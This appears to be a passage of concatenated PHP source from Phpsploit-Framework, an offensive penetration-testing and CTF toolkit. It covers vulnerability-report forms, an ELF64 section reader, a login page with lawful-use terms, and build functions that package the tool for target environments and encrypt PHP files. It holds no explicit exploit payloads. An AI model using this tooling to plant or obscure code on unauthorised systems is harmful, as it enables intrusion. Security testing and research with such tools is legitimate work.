            $_form_id   = ( 'report_vulnerability_report_form_id' );
            $_form_html = '';
            $_forms     = array ();
            foreach ( $_SESSION[ "VULNERABILITY_REPORT" ] as $report_index => $item ) {
                $_forms[ $report_index ] = array (
                    "action"    => "/report/delete_vulnerability_report" ,
                    "id"        => ( $_form_id . "_" . $report_index ) ,
                    "name"      => "report_vulnerability_report_form" ,
                    "hiddens"   => array (
                        array (
                            "id"    => "roport_index_" . $report_index ,
                            "name"  => "report_index_" . $report_index ,
                            "value" => $report_index ,
                        ) ,
                    ) ,
                    "selects"   => array (
                        array (
                            "id"       => "risk_level" ,
                            "title"    => "Risk Level : " ,
                            "name"     => "risk_level" ,
                            "options"  => array (
                                array ( "describe" => "Mild danger" , "title" => "Mild danger" , "value" => 1 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 1 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Mild to moderate danger" , "title" => "Mild to moderate danger" , "value" => 2 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 2 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Moderate danger" , "title" => "Moderate danger" , "value" => 3 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 3 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Moderate to severe danger" , "title" => "Moderate to severe danger" , "value" => 4 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 4 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Severe danger" , "title" => "Severe danger" , "value" => 5 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 5 ) ? "selected" : "" ) ) ,
                            ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => "discovery_method" ,
                            "title"    => "Discovery method : " ,
                            "name"     => "discovery_method" ,
                            "options"  => array (
                                array ( "describe" => "Black box penetration test" , "title" => "Black box penetration test" , "value" => 1 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "discovery_method" ] ) == 1 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "White box penetration test" , "title" => "White box penetration test" , "value" => 2 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "discovery_method" ] ) == 2 ) ? "selected" : "" ) ) ,
                            ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => "vulnerability_type" ,
                            "title"    => "Vulnerability type : " ,
                            "name"     => "vulnerability_type" ,
                            "options"  => array (
                                array ( "describe" => "Network vulnerabilities" , "title" => "Network vulnerabilities" , "value" => 1 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 1 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "System vulnerabilities" , "title" => "System vulnerabilities" , "value" => 2 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 2 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Software vulnerabilities" , "title" => "Software vulnerabilities" , "value" => 3 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 3 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Web Site vulnerabilities" , "title" => "Web Site vulnerabilities" , "value" => 4 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 4 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Other types of vulnerabilities" , "title" => "Other types of vulnerabilities" , "value" => 5 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 5 ) ? "selected" : "" ) ) ,
                            ) ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "inputs"    => array (
                        array (
                            "id"       => "vulnerability_name" ,
                            "title"    => "Vulnerability Name : " ,
                            "describe" => "Vulnerability Name" ,
                            "name"     => "vulnerability_name" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_name" ] ) ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => "vulnerability_discovery_personnel" ,
                            "title"    => "Vulnerability Discovery Personnel : " ,
                            "describe" => "Vulnerability Discovery Personnel" ,
                            "name"     => "vulnerability_discovery_personnel" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_discovery_personnel" ] ) ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => "contact_information_of_vulnerability_discovery_personnel" ,
                            "title"    => "Contact information of vulnerability discovery personnel : " ,
                            "describe" => "Contact information of vulnerability discovery personnel" ,
                            "name"     => "contact_information_of_vulnerability_discovery_personnel" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "contact_information_of_vulnerability_discovery_personnel" ] ) ) ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "id"       => 'vulnerability_impact' ,
                            "title"    => "Vulnerability Impact : " ,
                            "name"     => "vulnerability_impact" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_impact" ] ) ) ,
                            "style"    => 'height:200px;' ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => 'vulnerability_discovery_process' ,
                            "title"    => "Vulnerability Discovery Process : " ,
                            "name"     => "vulnerability_discovery_process" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_discovery_process" ] ) ) ,
                            "style"    => 'height:300px;' ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => 'solution_proposal' ,
                            "title"    => "Solution_proposal : " ,
                            "name"     => "solution_proposal" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "solution_proposal" ] ) ) ,
                            "style"    => 'height:400px;' ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "files"     => array () ,
                    "submit"    => array ( "id" => "submit" , "name" => "submit" , "value" => "delete" , "display" => true ) ,
                    "reset"     => array ( "id" => "reset" , "name" => "reset" , "value" => "reset" , "display" => false ) ,
                    "button"    => array (
                        "id"      => "edit_report" ,
                        "name"    => "edit_report" ,
                        "value"   => "edit report" ,
                        "display" => true ,
                        "events"  => array (
                            "onclick" => ' document.location.href=\'' . Class_Base_Response ::get_url ( "/report/edit_vulnerability_report" , array () ) . '\'; ' ,
                        ) ,
                    ) ,
                );
                $_form_html              .= Class_View ::form_body ( $_forms[ $report_index ] );
            }
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Report_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . ( $_form_html ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ console.log("init"); } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( $_SESSION[ "VULNERABILITY_REPORT" ] );
        }
        return null;
    }

    public static function export_vulnerability_report ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ( ! empty( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) && ( is_array ( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) ) {
            Class_Base_Report ::output_xls_file_content ( "vulnerability_report" , $_SESSION[ "VULNERABILITY_REPORT" ] );
        }
        return null;
    }

    public static function clear_vulnerability_report ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ( isset( $_SESSION ) ) && ( is_array ( $_SESSION ) ) && ( array_key_exists ( "VULNERABILITY_REPORT" , $_SESSION ) ) ) {
            $_SESSION[ "VULNERABILITY_REPORT" ] = null;
            unset( $_SESSION[ "VULNERABILITY_REPORT" ] );
            Class_Base_Response ::redirect ( "/report/create_vulnerability_report" , array () );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-3-14
 * Time: 下午1:47
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Map extends Class_Controller
{
    public static function index ( $params = array () )
    {
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-6
 * Time: 上午9:00
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_Section extends Class_Base
{
    private static $_section_types = array ( 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 0x60000000 , 0x6fffffff , 0x70000000 , 0x7fffffff );
    private static $_sections      = array ();

    public static function get_section_content ( $file_path , $section_type , $section_offset , $section_size , $section_name )
    {
        if ( ( is_string ( $file_path ) ) && ( strlen ( $file_path ) > 0 ) && ( file_exists ( $file_path ) ) && ( is_file ( $file_path ) ) && ( is_integer ( $section_type ) ) && ( in_array ( $section_type , self::$_section_types ) ) && ( is_integer ( $section_offset ) ) && ( is_integer ( $section_size ) ) && ( $section_size > 0 ) ) {
            $_file_tmp_point = fopen ( $file_path , "rb" );
            if ( ! empty( $_file_tmp_point ) ) {
                fseek ( $_file_tmp_point , $section_offset , SEEK_SET );
                $_section_content = @fread ( $_file_tmp_point , $section_size );
                fclose ( $_file_tmp_point );
                if ( ( ! array_key_exists ( $file_path , self::$_sections ) ) || ( ! is_array ( self::$_sections[ $file_path ] ) ) ) {
                    self::$_sections[ $file_path ] = array ();
                }
                if ( ( ! array_key_exists ( $section_offset , self::$_sections[ $file_path ] ) ) || ( ! is_array ( self::$_sections[ $file_path ][ $section_offset ] ) ) ) {
                    self::$_sections[ $file_path ][ $section_offset ] = array ();
                }
                self::$_sections[ $file_path ][ $section_offset ][ "sh_name" ]      = $section_name;
                self::$_sections[ $file_path ][ $section_offset ][ "name" ]         = Class_Base_Elf64_Section_Shstrtab::get_section_name ( $file_path , $section_name );
                self::$_sections[ $file_path ][ $section_offset ][ "type" ]         = $section_type;
                self::$_sections[ $file_path ][ $section_offset ][ "hex_type" ]     = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $section_type ) );
                self::$_sections[ $file_path ][ $section_offset ][ "type_name" ]    = Class_Base_Elf::get_sh_type_name ( $section_type );
                self::$_sections[ $file_path ][ $section_offset ][ "offset" ]       = $section_offset;
                self::$_sections[ $file_path ][ $section_offset ][ "hex_offset" ]   = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $section_offset ) );
                self::$_sections[ $file_path ][ $section_offset ][ "size" ]         = $section_size;
                self::$_sections[ $file_path ][ $section_offset ][ "hex_size" ]     = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $section_size ) );
                self::$_sections[ $file_path ][ $section_offset ][ "content_type" ] = "ascii_char";
                self::$_sections[ $file_path ][ $section_offset ][ "content" ]      = $_section_content;
                if ( ! is_null ( $_section_content ) ) {
                    return self::$_sections[ $file_path ][ $section_offset ];
                }
            }
        }
        return false;
    }

    public static function show_section_content ( $section_type , $section_content , &$section_content_type = null )
    {
        if ( $section_type == 3 ) {
            $_show_section_content = str_replace ( chr ( 0 ) , ( chr ( 32 ) ) , $section_content );
            $section_content_type  = "ascii_char";
        } else {
            $_show_section_content = Class_Base_Format::get_format_hex_content ( $section_content );
            $section_content_type  = "hex_char";
        }
        return $_show_section_content;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_File_Search extends Class_Controller
{
    public static function index ( $params = array () )
    {


        Class_Base_Response::output ( Class_View::index () );
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-7
 * Time: 下午3:11
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Login extends Class_View
{
    public static function login ( $params = array () )
    {
        if ( ! is_cli () ) {
            return ( Class_View::form_page (
                array (
                    "title"   => "login to phpsploit-framework" ,
                    "content" => '<div style="height:16px;"></div><div style="line-height:32px;font-size:32px;text-align: center;">login to phpsploit-framework</div><div style="height:32px;"></div>' ,
                ) ,
                array (
                    "action"    => "/login" ,
                    "inputs"    => array (
                        array (
                            "title"    => "User : " ,
                            "describe" => "user" ,
                            "name"     => "user" ,
                            "value"    => $params[ "user" ] ,
                        ) ,
                        array (
                            "title"    => "Password : " ,
                            "describe" => "password" ,
                            "name"     => "password" ,
                            "value"    => $params[ "password" ] ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "title"    => "Additional Service Terms ： " ,
                            "describe" => 'PhpSploit框架是专为善而非恶而设计的。如果您计划将此工具用于未经您执行评估的公司授权的恶意目的，则表示您违反了此工具集的服务条款和许可证。点击提交（仅一次），即表示您同意服务条款，并且您只能将此工具用于合法目的。' ,
                            "name"     => "additional_service_terms" ,
                            "value"    => 'The PhpSploit-Framework is designed purely for good and not evil. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. By hitting submit (only one time), you agree to the terms of service and that you will only use this tool for lawful purposes only.' ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "gets"      => array () ,
                ) ,
                array () )
            );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午2:53
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Build extends Class_Controller
{
    const BUILD_TYPE_LITE = 1;
    const BUILD_TYPE_FULL = 2;

    public static function index ( $params = array () )
    {
        $_build_type = Class_Base_Request::form ( "build_type" , Class_Base_Request::TYPE_INTEGER , self::BUILD_TYPE_LITE );
        if ( $_build_type == self::BUILD_TYPE_FULL ) {
            return self::_full ( $params );
        } else {
            return self::_lite ( $params );
        }
    }

    private static function _full ( $params = array () )
    {
        if ( ! is_cli () ) {
            if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
                Class_Base_Response::redirect ( "/login" );
                return null;
            }
            Class_Base_Auth::check_permission ();
            $_show_result_id = "show_result_id";
            $_show_error_id  = "show_error_id";
            $_cli_url        = Class_Base_Response::get_cli_url ( "/build" , array ( "is_build" => 1 , "type" => self::BUILD_TYPE_FULL ) );
            $_cli_encode_url = Class_Base_Response::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Build Project File</div>';
            $_form_top       .= '<div style="width:100%;word-break:break-all;margin-top:16px;padding-left:0;padding-right:0;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface is mainly used to create integration project software for the penetration testing target environment (the generated integration project software will include most of the software functions provided by the development testing environment, please note that this functional module can only run normally in the development testing environment). You have two construction modes to choose from, They are "lite" (lean mode) and "full" (full mode), respectively! When conducting penetration testing activities, we prioritize building "lite" (lean mode) project files! "Lite" (lean mode) is relatively small in file size and has the majority of practical penetration testing functions! "Full" (full mode) project files have a larger volume and contain "guide" library modules, which you can find in " Find relevant systems and third-party software commands commonly used in penetration testing and security operation and maintenance processes in the \'guide\' module! Note: that before formally building the project file, you should first modify the initialization content of the "PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD" constants in the "index. php" file in the Phpsploit Framework software project directory, otherwise the project file will not be able to be built properly! Legal constant content information can be obtained by accessing the "/user/create_production_privilege_user_password" interface!</div>';
            $_form           = array (
                "action"    => "/build" ,
                "selects"   => array (
                    array (
                        "id"      => "is_build" ,
                        "title"   => "Build Project : " ,
                        "name"    => "is_build" ,
                        "options" => array (
                            array ( "describe" => "Start Build" , "title" => "Build" , "value" => 1 , "selected" => ( "selected" ) ) ,
                            array ( "describe" => "No Start Build" , "title" => "No Build" , "value" => 0 , ) ,
                        ) ,
                    ) ,
                    array (
                        "id"      => "build_type" ,
                        "title"   => "Build Type : " ,
                        "name"    => "build_type" ,
                        "options" => array (
                            array ( "describe" => "Build Lite" , "title" => "Lite" , "value" => self::BUILD_TYPE_LITE ) ,
                            array ( "describe" => "Build full" , "title" => "Full" , "value" => self::BUILD_TYPE_FULL , "selected" => ( "selected" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_show_result_id ,
                        "title"    => "( Build Progress )   : " ,
                        "name"     => $_show_result_id ,
                        "value"    => "" ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                    array (
                        "id"       => $_show_error_id ,
                        "title"    => "( Error Message )   : " ,
                        "name"     => $_show_error_id ,
                        "value"    => "" ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top::top ();
            $_body           = array (
                "menu"    => Class_View_Build_Menu::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom         = Class_View_Bottom::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Auth::check_permission ();
        }
        $_is_build = Class_Base_Request::form ( "is_build" , Class_Base_Request::TYPE_INTEGER , 0 );
        if ( ! empty( $_is_build ) ) {
            $_new_file_path = Class_Operate_Build::create_new_full_file ();
            if ( $_new_file_path !== false ) {
                if ( ! is_cli () ) {
                    Class_Base_Response::output_textarea_inner_html ( $_show_result_id , ( "\n" . 'new file : ' . $_new_file_path . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response::outputln ( ( "\n" . "new file : " . $_new_file_path . "\n" ) );
                }
            }
        }
        return null;
    }

    private static function _lite ( $params = array () )
    {
        if ( ! is_cli () ) {
            if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
                Class_Base_Response::redirect ( "/login" );
                return null;
            }
            Class_Base_Auth::check_permission ();
            $_show_result_id = "show_result_id";
            $_show_error_id  = "show_error_id";
            $_cli_url        = Class_Base_Response::get_cli_url ( "/build" , array ( "is_build" => 1 , "type" => self::BUILD_TYPE_LITE ) );
            $_cli_encode_url = Class_Base_Response::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Build Project File</div>';
            $_form_top       .= '<div style="width:100%;word-break:break-all;margin-top:16px;padding-left:0;padding-right:0;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface is mainly used to create integration project software for the penetration testing target environment (the generated integration project software will include most of the software functions provided by the development testing environment, please note that this functional module can only run normally in the development testing environment). You have two construction modes to choose from, They are "lite" (lean mode) and "full" (full mode), respectively! When conducting penetration testing activities, we prioritize building "lite" (lean mode) project files! "Lite" (lean mode) is relatively small in file size and has the majority of practical penetration testing functions! "Full" (full mode) project files have a larger volume and contain "guide" library modules, which you can find in " Find relevant systems and third-party software commands commonly used in penetration testing and security operation and maintenance processes in the \'guide\' module!  Note: that before formally building the project file, you should first modify the initialization content of the "PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD" constants in the "index. php" file in the Phpsploit Framework software project directory, otherwise the project file will not be able to be built properly! Legal constant content information can be obtained by accessing the "/user/create_production_privilege_user_password" interface!</div>';
            $_form           = array (
                "action"    => "/build" ,
                "selects"   => array (
                    array (
                        "id"      => "is_build" ,
                        "title"   => "Build Project : " ,
                        "name"    => "is_build" ,
                        "options" => array (
                            array ( "describe" => "Start Build" , "title" => "Build" , "value" => 1 , "selected" => ( "selected" ) ) ,
                            array ( "describe" => "No Start Build" , "title" => "No Build" , "value" => 0 , ) ,
                        ) ,
                    ) ,
                    array (
                        "id"      => "build_type" ,
                        "title"   => "Build Type : " ,
                        "name"    => "build_type" ,
                        "options" => array (
                            array ( "describe" => "Build Lite" , "title" => "Lite" , "value" => self::BUILD_TYPE_LITE , "selected" => ( "selected" ) ) ,
                            array ( "describe" => "Build full" , "title" => "Full" , "value" => self::BUILD_TYPE_FULL , ) ,
                        ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_show_result_id ,
                        "title"    => "( Build Progress )   : " ,
                        "name"     => $_show_result_id ,
                        "value"    => "" ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                    array (
                        "id"       => $_show_error_id ,
                        "title"    => "( Error Message )   : " ,
                        "name"     => $_show_error_id ,
                        "value"    => "" ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top::top ();
            $_body           = array (
                "menu"    => Class_View_Build_Menu::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom         = Class_View_Bottom::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Auth::check_permission ();
        }
        $_is_build = Class_Base_Request::form ( "is_build" , Class_Base_Request::TYPE_INTEGER , 0 );
        if ( ! empty( $_is_build ) ) {
            $_new_file_path = Class_Operate_Build::create_new_lite_file ();
            if ( $_new_file_path !== false ) {
                if ( ! is_cli () ) {
                    Class_Base_Response::output_textarea_inner_html ( $_show_result_id , ( "\n" . 'new file : ' . $_new_file_path . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response::outputln ( ( "\n" . "new file : " . $_new_file_path . "\n" ) );
                }
            }
        }
        return null;
    }

    public static function encode_build ( $params = array () )
    {
        if ( ! is_cli () ) {
            if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
                Class_Base_Response::redirect ( "/login" );
                return null;
            }
            Class_Base_Auth::check_permission ();
            $_start               = Class_Base_Request::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
            $_input_file_path     = Class_Base_Request::form ( "input_file_path" , Class_Base_Request::TYPE_STRING , "" );
            $_save_directory_path = Class_Base_Request::form ( "save_directory_path" , Class_Base_Request::TYPE_STRING , "" );
            $_output_file_path    = null;
            $_encode_key          = null;
            $_encode_iv           = null;
            $_show_result_id      = "show_result_id";
            $_show_error_id       = "show_error_id";
            $_cli_url             = Class_Base_Response::get_cli_url ( "/encode_build" , array ( "start" => 1 , "is_build" => 1 , "input_file_path" => $_input_file_path , "save_directory_path" => $_save_directory_path ) );
            $_cli_encode_url      = Class_Base_Response::get_urlencode ( $_cli_url );
            $_form_top            = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Build Encode Project File</div>';
            $_form_top            .= '<div style="width:100%;word-break:break-all;margin-top:16px;padding-left:0;padding-right:0;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This function module is used to read the content of the specified file and encrypt it, while writing the encryption results to the newly created ciphertext file. Tip: If you are creating a ciphertext copy of a PHP type file, you can use the corresponding decryption module function (/decode_build) to restore the ciphertext copy of the PHP type file to a plaintext copy.</div>';
            $_form_name           = "form_0";
            $_form                = array (
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "action"    => "/encode_build" ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "id"      => "is_build" ,
                        "title"   => "Build Project : " ,
                        "name"    => "is_build" ,
                        "options" => array (
                            array ( "describe" => "Start Build" , "title" => "Encode Build" , "value" => 1 , "selected" => ( "selected" ) ) ,
                            array ( "describe" => "No Start Build" , "title" => "No Build" , "value" => 0 , ) ,
                        ) ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"    => "input_file_path" ,
                        "title" => "Input File Path : " ,
                        "name"  => "input_file_path" ,
                        "value" => $_input_file_path ,
                    ) ,
                    array (
                        "id"    => "save_directory_path" ,
                        "title" => "Save Directory Path : " ,
                        "name"  => "save_directory_path" ,
                        "value" => $_save_directory_path ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"    => $_show_result_id ,
                        "title" => "( Build Result )   : " ,
                        "name"  => $_show_result_id ,
                        "value" => "" ,
                        "style" => 'height:800px;' ,
                    ) ,
                    array (
                        "id"       => $_show_error_id ,
                        "title"    => "( Error Message )   : " ,
                        "name"     => $_show_error_id ,
                        "value"    => "" ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
